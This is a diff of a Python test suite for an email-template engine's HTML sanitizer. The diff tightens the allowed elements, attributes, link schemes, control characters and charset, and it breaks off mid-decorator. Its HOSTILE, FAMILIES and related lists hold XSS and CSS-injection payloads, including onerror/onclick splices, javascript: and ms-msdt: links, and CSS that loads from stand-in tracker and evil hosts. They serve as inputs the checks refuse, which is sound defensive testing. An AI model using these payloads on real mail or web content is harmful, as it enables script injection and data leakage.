@@ -4,10 +4,14 @@ from __future__ import annotations
 
 import asyncio
 import datetime
+import functools
 import inspect
+import itertools
 import logging
+import math
 import os
 import re
+import sys
 import threading
 import time
 import zoneinfo
@@ -53,15 +57,19 @@ from angee.messaging_templates.engine import (
     url,
 )
 from angee.messaging_templates.html_checks import (
+    CONTROL_CHARACTERS,
     LINK_ATTRIBUTES,
-    MODE_ELEMENTS,
+    MAIL_ATTRIBUTES,
+    MAIL_ELEMENTS,
     OUTPUT_ATTRIBUTES,
+    VOID_ELEMENTS,
     SpellingRule,
     check_html,
     compiled_expression,
 )
 from angee.messaging_templates.testing.models import MessageTemplate
 from angee.messaging_templates.walker import (
+    CONDITION_OPERATOR_LIMIT,
     WALKED_NODES,
     RowPiece,
     TemplateWalk,
@@ -169,9 +177,9 @@ def _recording(monkeypatch: pytest.MonkeyPatch, owner: object, name: str, record
 
     original = getattr(owner, name)
 
-    def recorded(*args: Any) -> Any:
-        record(*args)
-        return original(*args)
+    def recorded(*args: Any, **kwargs: Any) -> Any:
+        record(*args, **kwargs)
+        return original(*args, **kwargs)
 
     monkeypatch.setattr(owner, name, recorded)
 
@@ -235,18 +243,19 @@ GUARD_NODES = {
     "BlockNode": (("nodelist",), ["name", "nodelist", "parent"]),
     "TemplateTagNode": (("nodelist",), ["tagtype"]),
 }
+# is_safe is the engine's own (True for its markup filter alone); needs_autoescape and expects_localtime are Django's.
 GUARD_FILTERS = {
-    "capfirst": ((True, None, None), "(value)"),
+    "capfirst": ((False, None, None), "(value)"),
     "date": ((False, None, True), "(value, arg=None)"),
     "default": ((False, None, None), "(value, arg)"),
-    "floatformat": ((True, None, None), "(text, arg=-1)"),
+    "floatformat": ((False, None, None), "(text, arg=-1)"),
     "length": ((False, None, None), "(value)"),
     "linebreaksbr": ((True, True, None), "(value, autoescape=True)"),
-    "lower": ((True, None, None), "(value)"),
+    "lower": ((False, None, None), "(value)"),
     "pluralize": ((False, None, None), "(value, arg='s')"),
-    "title": ((True, None, None), "(value)"),
-    "truncatechars": ((True, None, None), "(value, arg)"),
-    "truncatewords": ((True, None, None), "(value, arg)"),
+    "title": ((False, None, None), "(value)"),
+    "truncatechars": ((False, None, None), "(value, arg)"),
+    "truncatewords": ((False, None, None), "(value, arg)"),
     "upper": ((False, None, None), "(value)"),
     "url": ((False, None, None), "(value: 'Any') -> 'str'"),
     "yesno": ((False, None, None), "(value, arg=None)"),
@@ -369,7 +378,8 @@ LONG = "a" * 1_001
         pytest.param({"source": "{% if a in items %}{% endif %}", "variables": {"a": "x", "items.*": "x"}},
                      "in takes a literal", id="11-in-value"),
         pytest.param({"source": "<script>x</script>", "format": "html", "text_source": "x"},
-                     "changes how a reader reads what follows", id="12-html"),
+                     "a mail is written with the document, table, text, link, list and image elements alone",
+                     id="12-html"),
         pytest.param({"source": "Use `{{ a }}` here.", "variables": {"a": "x"}}, "inside Markdown code inline",
                      id="12-markdown"),
         pytest.param({"source": "{{ secret }}"}, "secret is not in its variables", id="13-undeclared"),
@@ -537,21 +547,25 @@ def test_the_html_checks(html: str, refused: bool) -> None:
         html, compiled_expression(HTML_ENGINE))
 
 
+OFF_THE_LIST = [
+    "script", "iframe", "noscript", "xmp", "noembed", "noframes", "plaintext", "textarea", "svg", "math", "template",
+    "select", "option", "frameset", "frame", "object", "embed", "applet", "param", "form", "input", "button", "label",
+    "link", "base", "video", "audio", "source", "track", "picture", "map", "area", "colgroup", "col", "caption",
+    "marquee", "isindex", "image", "portal", "bgsound", "keygen", "dialog", "details", "summary", "menu", "slot",
+    "search", "nobr", "listing", "xml", "o:p", "abbr", "q", "wbr",
+]
+"""Elements off :data:`MAIL_ELEMENTS`: every mode-switching, framing, form, embedded and foreign element, and others."""
+
 R = SpellingRule
 SPELLING_REFUSED: list[tuple[SpellingRule, str, bool]] = [
-    (R.NO_NUL, "<p>a\x00b</p>", False),
-    (R.NO_NUL, '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ name }}">y</p>', False),
-    (R.NO_NUL, '<p title="\x009\x00">x</p>', False),
+    (R.NO_CONTROL, "<p>a\x00b</p>", False),
+    (R.NO_CONTROL, '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ name }}">y</p>', False),
+    (R.NO_CONTROL, '<p title="\x009\x00">x</p>', False),
     (R.LESS_THAN, "<p>5 < 6</p>", False),
     (R.LESS_THAN, "<p>x</p></><p>y</p>", False),
     (R.LESS_THAN, "<title>a<b</title>", False),
     (R.LESS_THAN, "<style>a<b{}</style>", False),
     (R.LESS_THAN, '<p title="a<b">x</p>', False),
-    (R.LESS_THAN, "<p>x</p><!-- note -->", False),
-    (R.LESS_THAN, "<!doctype html><p>x</p>", False),
-    (R.LESS_THAN, "<p>x</p><!doctype html>", True),
-    (R.LESS_THAN, "<?php x ?>", False),
-    (R.LESS_THAN, "<![CDATA[x]]>", False),
     (R.LESS_THAN, "<!x>", False),
     (R.LESS_THAN, "</ x>", False),
     (R.LESS_THAN, "<p>5 <", False),
@@ -561,11 +575,12 @@ SPELLING_REFUSED: list[tuple[SpellingRule, str, bool]] = [
     (R.START_TAG, '<p title="a" TITLE="b">y</p>', False),
     (R.START_TAG, '<p title = "x">y</p>', False),
     (R.START_TAG, '<p title="x" >y</p>', False),
-    (R.START_TAG, '<p\x0ctitle="x">y</p>', False),
-    (R.START_TAG, '<p\x0btitle="x">y</p>', False),
+    (R.NO_CONTROL, '<p\x0ctitle="x">y</p>', False),
+    (R.NO_CONTROL, '<p\x0btitle="x">y</p>', False),
     (R.START_TAG, '<p title="a&b">y</p>', False),
     (R.START_TAG, '<p title="x"title="y">z</p>', False),
     (R.START_TAG, '<p/title="x">y</p>', False),
+    (R.START_TAG, '<td bac\u212aground="#">x</td>', False),
     *((R.SELF_CLOSING, opening, False)
       for opening in ("<style/>", "<style />", "<STYLE/>", '<style media="all"/>', "<title/>", "<p/>",
                       '<a href="https://example.test/" />')),
@@ -579,7 +594,7 @@ SPELLING_REFUSED: list[tuple[SpellingRule, str, bool]] = [
     (R.TEMPLATE_CODE, "<p>x</p{{ x }}>", False),
     (R.TEMPLATE_CODE, "<title>Hi</title{{ v }}><p>x</p></title>", False),
     (R.TEMPLATE_CODE, "<!--{{ x }}-->", True),
-    *((R.MODE_ELEMENTS, f"<{tag}>x</{tag}>", False) for tag in sorted(MODE_ELEMENTS)),
+    *((R.ELEMENTS, f"<{tag}>x</{tag}>", False) for tag in OFF_THE_LIST),
     (R.ENDS_IN_TEXT, "<p>x</p><a", False),
     (R.ENDS_IN_TEXT, '<p>x</p><a title="x', False),
     (R.ENDS_IN_TEXT, '<p>x</p><a href="https://example.test/"', False),
@@ -612,11 +627,131 @@ def test_each_spelling_rule_refuses_with_its_message(rule: SpellingRule, html: s
     assert any(rule.message in refusal and f"(rule {rule.value})" in refusal for refusal in refusals), refusals
 
 
+XHTML = (
+    '<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" '
+    '"http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">'
+)
+VML_BUTTON = (
+    '<div><!--[if mso]><v:roundrect href="https://example.test/" arcsize="10%"><w:anchorlock/><center><![endif]-->'
+    '<a href="https://example.test/">Go</a><!--[if mso]></center></v:roundrect><![endif]--></div>'
+)
+DECLARATION = "a layout opens with <!doctype html>, the one declaration a mail holds (rule 2)"
+MESSAGES: list[tuple[str, bool, str]] = [
+    ("<p>x</p><!-- note -->", False, "the comment '<!-- note -->': write a note as {# … #}, which no mail carries; a "
+     "layout alone holds Outlook's comments (rule 2)"),
+    ("<!-- Preheader --><p>x</p>", True, "the comment '<!-- Preheader -->': write a note as {# … #}, which no mail "
+     "carries; a layout holds Outlook's <!--[if mso]>…<![endif]--> and the <!--[if !mso]><!-->…<!--<![endif]--> "
+     "pair (rule 2)"),
+    (XHTML + "<p>x</p>", True,
+     f"the declaration '<!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Transitional//…': {DECLARATION}"),
+    ("<!doctype html><p>x</p>", False, f"the declaration '<!doctype html>': {DECLARATION}"),
+    ("<p>x</p><!doctype html>", True, f"the declaration '<!doctype html>': {DECLARATION}"),
+    ("<?php x ?>", False, "the processing instruction '<?php x ?>': a mail holds none; write a note as {# … #}, which "
+     "no mail carries (rule 2)"),
+    ("<![CDATA[x]]>", False, "the marked section '<![CDATA[x]]>': a mail holds none; write its text with &lt; and "
+     "&amp; (rule 2)"),
+    (VML_BUTTON, True, "in an Outlook comment: <v:roundrect> is Office vector markup, which a mail does not carry: a "
+     "button drawn with it would need a value inside a comment, so write the button as a link (rule 7)"),
+    ('<a href="https://example.test/café">x</a>', False,
+     "the href of <a> holds a space or a character a link percent-encodes: write https://example.test/caf%C3%A9"),
+    ("<p>x</p >", False, "the end tag '</p >': an end tag is </name> and nothing else (rule 5)"),
+]
+"""Refusals that say what to write: a note, the one doctype, no vector markup, a percent-encoded link."""
+
+
+@pytest.mark.parametrize(("html", "document", "message"), MESSAGES)
+def test_a_refusal_says_how_to_write_the_row(html: str, document: bool, message: str) -> None:
+    """Each refusal quotes what the author wrote and says what a mail holds instead."""
+
+    assert message in check_html(html, compiled_expression(HTML_ENGINE), document=document)
+
+
+def test_a_markdown_link_whose_label_and_target_are_values_is_admitted(plain: Any, kit: Any) -> None:
+    """[{{ label }}]({{ link }}): the HTML writes the target before the label, and both reach the template whole."""
+
+    del plain
+    template = _mail("Hello, [{{ label }}]({{ link }}).", {"label": "x", "link": "x"}, key="tests.link")
+    assert _refusals(template) == []
+    rendered = _render(template, {"label": "Sign in", "link": "https://example.test/a b"}, kit)
+    assert '<a href="https://example.test/a%20b"' in rendered.html and ">Sign in</a>" in rendered.html
+    assert "Sign in (https://example.test/a%20b)" in rendered.plain_text
+
+
 @pytest.mark.parametrize(("html", "document"), SPELLING_ADMITTED)
 def test_the_strict_spelling_admits_what_every_reader_reads_alike(html: str, document: bool) -> None:
     """The case of names, the gaps between attributes, void elements' slashes and character references are free."""
 
     assert check_html(html, compiled_expression(HTML_ENGINE), document=document) == []
+
+
+def test_a_mail_declares_one_character_set(kit: Any) -> None:
+    """A layout's meta charset is utf-8, any case: under iso-2022-jp an escape in a value switched the reader's
+    character set and a later value became an attribute."""
+
+    jp = PLAIN_LAYOUT.replace("<head>", '<head><meta charset="iso-2022-jp">')
+    template = _unsaved(format="html", source='<p><img alt="{{ a }}" src="https://example.test/x.png">{{ e }}'
+                        '<b title="{{ d }}">Hi</b></p>', text_source="x", variables={"a": "x", "e": "x", "d": "x"},
+                        layout="jp")
+    refusals = TemplateWalker(saving=True).judge(
+        template, _Rows(template, _unsaved("layout", "jp", source=jp, text_source=PLAIN_TEXT))).refusals
+    assert refusals == ["layouts/jp: the charset of <meta> is utf-8, the one a mail is sent in"]
+    utf8 = PLAIN_LAYOUT.replace("<head>", '<head><meta charset="UTF-8">')
+    walk = TemplateWalker(saving=True).walk(
+        template, _Rows(template, _unsaved("layout", "jp", source=utf8, text_source=PLAIN_TEXT)))
+    html = walk.render({"a": "\x1b$B", "e": "\x1b(B", "d": "x src=x onerror=alert(1) y"}, kit=kit).html
+    assert "\x1b" not in html and 'alt="$B"' in html
+
+
+def test_a_value_drops_its_control_characters(plain: Any, kit: Any) -> None:
+    """prepare() drops the C0 and C1 controls but tab, newline and return from every string, as a subject does; a
+    value of controls alone is empty."""
+
+    del plain
+    template = _mail("<p>{{ s }}|{% if t %}T{% else %}empty{% endif %}|{{ u }}</p>", {"s": "x", "t": "x", "u": "x"},
+                     format="html", text_source="{{ s }}|{{ t }}|{{ u }}", subject="{{ s }}")
+    rendered = _render(template, {"s": "a\x1b$B\x00b\x07\x85c\x9f", "t": "\x00\x1b\x0c", "u": "a\tb\nc\rd"}, kit)
+    assert "<p>a$Bbc|empty|a\tb\nc\rd</p>" in rendered.html
+    assert rendered.plain_text.startswith("a$Bbc||a\tb\nc\rd")
+    assert rendered.subject == "a$Bbc"
+
+
+def test_a_row_holds_no_control_character_and_a_return_is_a_newline(plain: Any) -> None:
+    """Rule 1 for every text column: no control character but tab and newline. clean() writes a carriage return as a
+    newline first, so pasted text has the content hash of the same text written with newlines."""
+
+    del plain
+    for character in ("\x00", "\x1b", "\x0c", "\x0b", "\x85", "\r", "\x7f"):
+        for column in ("source", "text_source", "subject", "preheader"):
+            row = _unsaved(format="html", **{"source": "<p>x</p>", "text_source": "x", column: f"a{character}b"})
+            assert any(R.NO_CONTROL.message in refusal for refusal in _refusals(row)), (character, column)
+    pasted = _unsaved(source="Line one\r\nLine two\rThree", subject="Hi\r\nthere", key="tests.pasted")
+    written = _unsaved(source="Line one\nLine two\nThree", subject="Hi\nthere", key="tests.pasted")
+    with system_context(reason="tests.messaging_templates.render.clean"):
+        pasted.full_clean()
+    assert (pasted.source, pasted.subject) == (written.source, written.subject)
+    assert pasted.compute_content_hash() == written.compute_content_hash()
+
+
+def test_a_mail_is_written_with_its_own_elements_and_attributes() -> None:
+    """Rule 7 and the attribute list: each listed element and attribute is admitted, and every other is refused by
+    name with one message, an Office setting admitted inside a layout's Outlook comment alone."""
+
+    expression = compiled_expression(HTML_ENGINE)
+    for tag in sorted(MAIL_ELEMENTS):
+        form = f"<{tag}>" if tag in VOID_ELEMENTS else f"<{tag}>x</{tag}>"
+        assert check_html(form, expression) == [], tag
+    values = {"href": "https://example.test/", "src": "https://example.test/a.png", "background": "#",
+              "cite": "https://example.test/", "charset": "utf-8"}
+    for name in sorted(MAIL_ATTRIBUTES):
+        assert check_html(f'<p {name}="{values.get(name, "x")}">x</p>', expression) == [], name
+    for name in ("onclick", "onerror", "http-equiv", "srcset", "srcdoc", "formaction", "ping", "longdesc", "data",
+                 "data-x", "poster", "action", "popover", "xlink:href", "usemap", "is"):
+        assert check_html(f'<p {name}="x">x</p>', expression) == [
+            f"the {name} attribute is not one a mail is written with (MAIL_ATTRIBUTES)"], name
+    office = "<!--[if mso]><xml><o:OfficeDocumentSettings><o:AllowPNG/><o:PixelsPerInch>96</o:PixelsPerInch>" \
+             "</o:OfficeDocumentSettings></xml><![endif]-->"
+    assert check_html(office, expression, document=True) == []
+    assert check_html(office.replace("xml>", "xmp>"), expression, document=True) != []
 
 
 def test_a_self_closing_style_is_refused_by_rule_4(plain: Any) -> None:
@@ -651,9 +786,9 @@ def test_a_literal_nul_is_refused_by_rule_1_before_anything_reads_it(
     for source in ('<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ name }}">y</p>',
                    '<p title="\x009\x00">x</p>'):
         row = _unsaved(format="html", source=source, text_source="x", variables={"name": "x"})
-        assert any(R.NO_NUL.message in refusal for refusal in _refusals(row)), source
+        assert any(R.NO_CONTROL.message in refusal for refusal in _refusals(row)), source
         saved = _mail(source, {"name": "x"}, format="html", text_source="x", key="tests.nul")
-        with pytest.raises(ValidationError, match="NUL"):
+        with pytest.raises(ValidationError, match="no control character"):
             _render(saved, {"name": "x"}, kit)
         with system_context(reason="tests.messaging_templates.render.nul"):
             assert saved.preview(kit=kit).rendered is None
@@ -668,7 +803,7 @@ def test_a_literal_nul_is_refused_by_rule_1_before_anything_reads_it(
         override.save()  # past clean: the deployment's row holds a NUL
         with caplog.at_level(logging.WARNING, logger="angee.messaging_templates.models"):
             MessageTemplate.after_resource_load([template], tier="install", source="tests")
-    assert any("NUL" in record.getMessage() for record in caplog.records)
+    assert any("no control character" in record.getMessage() for record in caplog.records)
 
 
 @pytest.mark.parametrize(
@@ -706,17 +841,36 @@ def test_a_row_cannot_leave_the_next_row_inside_a_tag_or_a_style(plain: Any, kit
             _render(template, {"link": "javascript:alert(document.domain)"}, kit)
 
 
+def test_a_static_link_is_absolute_or_a_fragment_or_a_cid_image() -> None:
+    """An author's link: what url leaves unchanged, a #fragment or a cid: image; a space or a character outside
+    ASCII is refused with the percent-encoded link to write."""
+
+    expression = compiled_expression(HTML_ENGINE)
+    for link in ("https://example.test/a?b=1&amp;c=2", "mailto:a@example.test", "tel:+1", "#", "#top", "cid:logo",
+                 "HTTPS://EXAMPLE.TEST/"):
+        assert check_html(f'<a href="{link}">x</a>', expression) == [], link
+    for link in ("//example.test/", "/settings", "settings", "ms-msdt:/id", "cid:a b", "#a b"):
+        assert check_html(f'<a href="{link}">x</a>', expression) == [
+            "the href of <a> is not a link a mail may carry: an absolute https, http, mailto or tel link, "
+            "a #fragment or a cid: image"], link
+    assert check_html('<a href="https://example.test/café">x</a>', expression) == [
+        "the href of <a> holds a space or a character a link percent-encodes: write https://example.test/caf%C3%A9"]
+    assert check_html('<a href="mailto:a@example.test?subject=Hi there">x</a>', expression) == [
+        "the href of <a> holds a space or a character a link percent-encodes: write "
+        "mailto:a@example.test?subject=Hi%20there"]
+
+
 def test_link_attributes_follow_url_and_text_attributes_are_text() -> None:
     """URL-valued attributes: the ones mail links with follow url; the others are refused by name; text is text."""
 
     expression = compiled_expression(HTML_ENGINE)
-    for name in ("href", "src", "background", "cite", "poster", "action"):
+    for name in sorted(LINK_ATTRIBUTES):
         for value in ("javascript:alert(1)", "JaVaScRiPt:x", "java&#9;script:x", "data:text/html,x"):
             assert check_html(f'<td {name}="{value}">x</td>', expression), (name, value)
         assert check_html(f'<td {name}="https://example.test/a.png">x</td>', expression) == [], name
     for name in ("ping", "longdesc", "lowsrc", "dynsrc", "usemap", "data", "codebase", "archive", "manifest",
-                 "profile", "formaction", "srcset", "icon", "xlink:href"):
-        assert any(f"the {name} attribute is not allowed" in refusal for refusal in check_html(
+                 "profile", "formaction", "srcset", "icon", "xlink:href", "poster", "action"):
+        assert any(f"the {name} attribute is not one a mail" in refusal for refusal in check_html(
             f'<img {name}="https://example.test/">', expression)), name
     # A scheme an author splices from branches has nowhere left to go: each URL attribute is listed.
     assert check_html('<img longdesc="{% if a %}java{% else %}x{% endif %}script:alert(1)" alt="a">', expression)
@@ -780,7 +934,7 @@ def test_only_a_layout_carries_outlooks_comments(plain: Any) -> None:
     assert _refusals(_unsaved("layout", "outlook", source=OUTLOOK_DPI + PLAIN_LAYOUT, text_source=PLAIN_TEXT)) == []
     for row in (_unsaved(format="html", source=OUTLOOK_DPI, text_source="x"),
                 _unsaved("block", "outlook", source=OUTLOOK_DPI, text_source="x")):
-        assert any("which a layout alone holds for Outlook" in refusal for refusal in _refusals(row)), row.kind
+        assert any("a layout alone holds Outlook's comments" in refusal for refusal in _refusals(row)), row.kind
 
 
 def test_static_url_as_decoded() -> None:
@@ -903,15 +1057,19 @@ def test_values_never_become_markdown(plain: Any, kit: Any) -> None:
 # ---------- values ----------
 
 
+@functools.lru_cache(maxsize=4_096)
 def _reading(html: str, *, scripting: bool) -> tuple[list[tuple[Any, ...]], list[str]]:
     """What a browser reads of a rendered body, by html5lib's WHATWG tokeniser and tree construction.
 
     The elements in document order with their attributes, and the comments; then the text of every ``style`` and
     ``script`` element. ``scripting`` reads ``noscript`` as a browser with scripting on or off does. Independent of
-    the ``html.parser`` the HTML checks are built on, so a difference between the two is what it finds.
+    the ``html.parser`` the HTML checks are built on, so a difference between the two is what it finds. The whole
+    document is read, what lies before and after its ``html`` element too.
     """
 
-    root = html5lib.HTMLParser(namespaceHTMLElements=False).parse(html, scripting=scripting)
+    root = html5lib.HTMLParser(
+        tree=html5lib.getTreeBuilder("etree", fullTree=True), namespaceHTMLElements=False,
+    ).parse(html, scripting=scripting)
     markup: list[tuple[Any, ...]] = []
     raw: list[str] = []
     for element in root.iter():
@@ -931,16 +1089,20 @@ _HTML_SPACE = " \t\n\f\r"
 def _harmless(value: str) -> str:
     """The harmless value a hostile ``value`` is compared with: of its kind, empty, HTML white space, or visible text.
 
-    An author's ``{% if v %}`` chooses author markup by a value's truthiness, and a browser's tree builder implies
+    A value of control characters alone is empty once :meth:`TemplateWalk.prepare` drops them. An author's
+    ``{% if v %}`` chooses author markup by a value's truthiness, and a browser's tree builder implies
     or clones author elements by whether text is present and whether it is white space (a stray ``</p>`` before the
     body, text in a table, a formatting element reopened). Neither makes a value markup, so values are compared
     with one of their own kind: the same empty or white-space value, else :data:`MARKER`.
     """
 
-    return value if not value.strip(_HTML_SPACE) else MARKER
+    visible = re.sub(f"[{CONTROL_CHARACTERS}]", "", value)  # what prepare() leaves of it
+    return value if not visible.strip(_HTML_SPACE) else MARKER
 
 
-def _assert_value_stays_text(marker_html: str, hostile_html: str, value: str) -> None:
+def _assert_value_stays_text(
+    marker_html: str, hostile_html: str, value: str, *, scriptings: tuple[bool, ...] = (False, True),
+) -> None:
     """Property 1: ``value`` adds no element, attribute or comment, no text in style or script, a link only by ``url``.
 
     ``marker_html`` is the same rows rendered with ``_harmless(value)``. A browser's reading of both has
@@ -949,7 +1111,7 @@ def _assert_value_stays_text(marker_html: str, hostile_html: str, value: str) ->
     makes a link of the value.
     """
 
-    for scripting in (False, True):
+    for scripting in scriptings:
         (marker, marker_raw), (hostile, hostile_raw) = (
             _reading(marker_html, scripting=scripting), _reading(hostile_html, scripting=scripting))
         assert hostile_raw == marker_raw, (hostile_raw, marker_raw)
@@ -960,6 +1122,9 @@ def _assert_value_stays_text(marker_html: str, hostile_html: str, value: str) ->
                 continue
             assert [name for name, _ in after[2]] == [name for name, _ in before[2]], (before, after)
             for (name, was), (_, now) in zip(before[2], after[2], strict=True):
+                if name in LINK_ATTRIBUTES and now != was:
+                    # Judged apart from url itself: an absolute link of the four schemes, or none.
+                    assert now == "" or now.lower().startswith(SENT_SCHEMES), (before[1], name, now)
                 if name in OUTPUT_ATTRIBUTES or (
                     name in LINK_ATTRIBUTES and (was, now) == (url(_harmless(value)), url(value))
                 ):
@@ -981,13 +1146,20 @@ class _Rows:
         return name in self.rows
 
 
+SENT_SCHEMES = ("https://", "http://", "mailto:", "tel:")
 SPLICE = "y style=color:red onclick=alert(1)"
 JAVASCRIPT = "javascript:alert(document.domain)"
 CSS = "}*{background:url(https://tracker.example/leak?)}@import url(https://evil.example/x.css);"
+CUT = "aaaaaa\nx onmouseover=alert(1) style=background:url(https://tracker.example/leak);x:"
 HOSTILE = [
     SPLICE, JAVASCRIPT, CSS, '"><b onclick=x>', "</style><b onclick=x>", "' onclick=x '", "-->", "]]>", "x\x00y",
-    "/", "/ onerror=alert(1)", ";background-image:url(https://tracker.example/leak)",
+    "/", "/ onerror=alert(1)", ";background-image:url(https://tracker.example/leak)", CUT,
+    "1;alert(document.domain)//", "ms-msdt:/id PCWDiagnostic", "//evil.example/x", "/settings/forward",
+    "\x1b$B\"><b onclick=x>", "\x00", "\x1b\x0c\x00", " ", "", "\n\n", "\U0001f600", "&amp;quot;",
+    "</title><img src=x onerror=alert(1)>",
 ]
+"""Values of every kind: attribute and element splices, schemes, CSS, a cut line break, control characters and a
+value of controls alone, white space, empty."""
 
 _ATTRIBUTE = st.builds(
     lambda gap, name, quoting, value: gap + name + quoting.format(value),
@@ -1008,20 +1180,67 @@ _PLAIN_TAG = st.builds(
     lambda tag, attributes, end: "<" + tag + "".join(attributes) + end,
     st.sampled_from(["p", "span", "a", "td", "table", "tr", "b", "div", "img", "br", "title", "style"]),
     st.lists(st.builds(
-        lambda name, value: f' {name}="{value}"',
+        lambda name, quoting, value: f" {name}" + quoting.format(value),
         st.sampled_from(["title", "alt", "href", "style", "class", "lang", "src"]),
+        st.sampled_from(['="{}"'] * 6 + ["={}", "='{}'"]),
         st.sampled_from(["x", "{{ v }}", "{{ v|url }}", "{% if v %}{{ v }}{% endif %}", "color:{{ brand.light.text }}",
                          "&amp;", ""]),
     ), max_size=2, unique_by=lambda attribute: attribute.split("=", 1)[0]),
     st.sampled_from([">", " />"]),
 )
-"""Tags spelled as the checks admit them, so that admitted compositions are drawn often enough to matter."""
+"""Tags spelled as the checks admit them, so that admitted compositions are drawn often enough to matter, a value
+now and then unquoted or single-quoted."""
+FAMILIES: list[tuple[dict[str, str], str]] = [
+    ({"before": "<script>var a = 1; {{ v }}</script>"}, "1;alert(document.domain)//"),
+    ({"before": "<svg><style>{{ v }}</style></svg>"}, CSS),
+    ({"before": "<math><mi><style>{{ v }}</style></mi></math>"}, CSS),
+    ({"before": '<frameset rows="*"><frame src="{{ v|url }}"></frameset>'}, "https://evil.example/page"),
+    ({"before": "<p title={{ v }}>x</p>"}, SPLICE),
+    ({"before": "<p title='{{ v }}'>x</p>"}, "' onclick=x '"),
+    ({"before": '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>'},
+     ";background-image:url(https://tracker.example/leak)"),
+    ({"before": '<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>'},
+     "/ onerror=alert(1)"),
+    ({"block": "<p>Hi</p><style/>", "after": "<p>Hello {{ v }}, welcome.</p>"}, CSS),
+    ({"head": "<p>Hi</p><style/>", "after": "<p>Hello {{ v }}.</p>"}, CSS),
+    ({"block": "<p>Hi</p><style>", "after": "Hello {{ v }}, welcome."}, CSS),
+    ({"block": "<p>Hi</p><a", "after": ' href="{{ v }}" style="background:url({{ v }})">Open</a>'}, JAVASCRIPT),
+    ({"block": '<p>Hi</p><a title="x', "after": '" href="{{ v }}">Open</a>'}, JAVASCRIPT),
+    ({"before": "<p>{{ v|linebreaksbr|truncatechars:3 }} {{ v }}</p>"}, "\n" + SPLICE),
+    ({"before": '<a href="{{ v|url }}">x</a>'}, "ms-msdt:/id PCWDiagnostic"),
+    ({"head": '<meta charset="iso-2022-jp">', "before": '<p title="{{ v }}">x</p>'}, '\x1b$B"><b onclick=x>'),
+]
+"""Each family the closed lists refuse, as the row parts it takes and the value that shows what it would break: an
+element off the list holding a value, an unquoted or single-quoted output, a NUL forging a placeholder, a < in a
+title, a self-closing or unclosed style, a row ending inside a tag, a markup filter cut, a scheme off the list, a
+character set other than UTF-8."""
+
+_REFUSED = st.sampled_from([
+    # Rule 7: elements off the list, each holding a value where a reader would not read text.
+    *(f"<{tag}>{{{{ v }}}}</{tag}>" for tag in (
+        "script", "iframe", "noembed", "noframes", "xmp", "textarea", "template", "select", "plaintext", "object")),
+    "<script>var a = 1; {{ v }}</script>", "<svg><style>{{ v }}</style></svg>", "<math><mi>{{ v }}</mi></math>",
+    '<frameset rows="*"><frame src="{{ v|url }}"></frameset>',
+    # Rule 3: an output unquoted or single-quoted.
+    "<p title={{ v }}>x</p>", "<p title='{{ v }}'>x</p>", '<img alt={{ v }} src="https://example.test/a.png">',
+    # Rule 1: a literal NUL forging the placeholder of an output the style admits.
+    '<p style="color:{{ brand.light.text }}">x</p><p style="\x000{{ v }}">y</p>',
+    # Rules 2 and 6: a < inside a title that ends where a reader would not end it.
+    '<title>Hi</title{{ v }}><img alt={{ v }} src="https://example.test/x.png"></title>',
+    # Rule 4: a style closed with a slash a reader ignores.
+    "<style/><p>{{ v }}</p>",
+    # Filters: a markup filter cut by the next one.
+    *(f"<p>{{{{ v|linebreaksbr|truncatechars:{size} }}}} {{{{ v }}}}</p>" for size in (8, 9, 10)),
+    # Links and the character set.
+    '<a href="{{ v|url }}">x</a>', '<meta charset="iso-2022-jp">',
+])
+"""One piece of each family the closed lists refuse, drawn often enough that a dropped rule admits one."""
 _PLAIN = st.sampled_from([
     "</p>", "</span>", "</a>", "</b>", "</div>", "</td>", "</tr>", "</title>", "text", "{{ v }}", "&amp;", "AT&T",
     "{% if v %}{{ v }}{% endif %}",
 ])
 _HTML = st.lists(
-    st.one_of(_PLAIN_TAG, _PLAIN_TAG, _PLAIN_TAG, _PLAIN, _PLAIN, _PLAIN, _START_TAG, st.sampled_from([
+    st.one_of(_PLAIN_TAG, _PLAIN_TAG, _PLAIN_TAG, _PLAIN, _PLAIN, _PLAIN, _START_TAG, _REFUSED, st.sampled_from([
         "</style>", "</style\x0b>", "</style/>", "</table>", "</select>", '"', "'", ">", "<", "&", "&lt", "\n",
         "<!--x-->", "<!x>", "</ x>", "<?x>", "</>", "<![CDATA[x]]>", "<!doctype html>", '</p x="{{ v }}">', "<br/>",
         "</title{{ v }}>", "<style/>", "<!--[if mso]><b>x</b><![endif]-->", "{% if v %}", "{% endif %}",
@@ -1037,35 +1256,54 @@ _PART = st.one_of(st.just(""), _HTML)
     suppress_health_check=[HealthCheck.function_scoped_fixture, HealthCheck.too_slow, HealthCheck.filter_too_much],
 )
 @given(head=_PART, tail=_PART, before=_PART, block=_PART, after=_PART, value=st.one_of(
-    st.sampled_from(HOSTILE), st.text(max_size=40)))
+    st.sampled_from(HOSTILE), st.text(max_size=40)), family=st.one_of(st.none(), st.sampled_from(FAMILIES)),
+    family_value=st.booleans())
 # Rows found to break the property: a repeated attribute name and a noscript splice (S1); a row ending inside a tag
 # or a <style> (S2); a self-closing <style/>, in a block and in a layout (rule 4); template code glued to </title
 # (rule 6); a literal NUL forging a placeholder (rule 1).
-@example(head="", tail="", before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
-@example(head="", tail="", before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE)
+@example(head="", tail="", before='<span title="a" title={{ v }}>x</span>', block="", after="", value=SPLICE,
+         family=None, family_value=False)
+@example(head="", tail="", before='<span TITLE="a" title={{ v }}>x</span>', block="", after="", value=SPLICE,
+         family=None, family_value=False)
 @example(head="", tail="", before='<noscript><p title="</noscript><b title={{ v }}>"></p></noscript>', block="",
-         after="", value=SPLICE)
+         after="", value=SPLICE,
+         family=None, family_value=False)
 @example(head="", tail="", before="", block="<p>Hi</p><a",
-         after=' href="{{ v }}" style="background:url({{ v }})">Open</a>', value=JAVASCRIPT)
+         after=' href="{{ v }}" style="background:url({{ v }})">Open</a>', value=JAVASCRIPT,
+         family=None, family_value=False)
 @example(head="", tail="", before="", block='<p>Hi</p><a title="x', after='" href="{{ v }}">Open</a>',
-         value=JAVASCRIPT)
